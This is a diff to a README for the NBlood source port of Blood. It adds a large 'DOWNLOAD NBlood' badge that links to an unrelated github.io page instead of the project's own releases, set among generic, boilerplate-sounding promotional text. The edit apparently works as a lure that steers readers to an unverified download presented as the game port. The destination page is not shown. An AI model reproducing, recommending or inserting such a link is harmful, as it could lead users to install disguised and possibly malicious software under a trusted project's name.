@@ -30,6 +30,12 @@ NBlood is a faithful source port of Blood (1997) using the original BUILD engine
 
 Whether you're a newcomer or a veteran, NBlood provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download NBlood](https://img.shields.io/badge/⬇_DOWNLOAD_NBlood-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
